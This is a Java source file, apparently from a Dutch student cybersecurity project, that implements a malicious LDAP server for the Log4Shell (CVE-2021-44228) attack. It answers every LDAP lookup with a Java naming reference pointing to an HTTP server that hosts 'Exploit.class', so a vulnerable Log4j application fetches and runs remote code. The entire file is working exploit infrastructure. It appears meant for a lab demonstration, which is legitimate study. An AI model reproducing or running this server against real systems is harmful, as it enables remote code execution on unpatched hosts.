// LdapServer.java
// Auteur: Sander Schepers - Project CyberSec25
// Beschrijving: LDAP-server om Log4Shell (CVE-2021-44228) payloads te demonstreren.

import com.unboundid.ldap.listener.*;
import com.unboundid.ldap.sdk.*;

public class LdapServerDemo {

    public static void main(String[] args) throws Exception {
        String httpServer = "http://127.0.0.1:8000/"; // URL naar Exploit.class
        int ldapPoort = 1389;

        // Configuratie voor in-memory LDAP-server
        InMemoryDirectoryServerConfig ldapConfig = new InMemoryDirectoryServerConfig("dc=sander,dc=com");
        ldapConfig.setSchema(null); // Geen schema-validatie nodig

        // LDAP listener configureren
        InMemoryListenerConfig listenerConfig = InMemoryListenerConfig.createLDAPConfig("default", ldapPoort);
        ldapConfig.setListenerConfigs(listenerConfig);

        // Interceptor toevoegen voor inkomende zoekopdrachten
        ldapConfig.addInMemoryOperationInterceptor(new InMemoryOperationInterceptor() {
            @Override
            public void processSearchResult(InMemoryInterceptedSearchResult resultaat) {
                String basisDN = resultaat.getRequest().getBaseDN();
                System.out.println("[+] LDAP zoekopdracht ontvangen voor: " + basisDN);

                try {
                    Entry invoer = new Entry(basisDN);
                    invoer.addAttribute("javaClassName", "Exploit");
                    invoer.addAttribute("javaCodeBase", httpServer);
                    invoer.addAttribute("objectClass", "javaNamingReference");
                    invoer.addAttribute("javaFactory", "Exploit");

                    resultaat.sendSearchEntry(invoer);
                    resultaat.setResult(new LDAPResult(0, ResultCode.SUCCESS));
                    System.out.println("[+] LDAP verwijzing verstuurd naar " + httpServer + "Exploit.class");

                } catch (Exception e) {
                    System.err.println("[-] Verwijzing verzenden mislukt:");
                    e.printStackTrace();
                }
            }
        });

        // Start de LDAP-server
        InMemoryDirectoryServer server = new InMemoryDirectoryServer(ldapConfig);
        server.startListening();
        System.out.println("[+] LDAP-server luistert nu op 0.0.0.0:" + ldapPoort);
    }
}
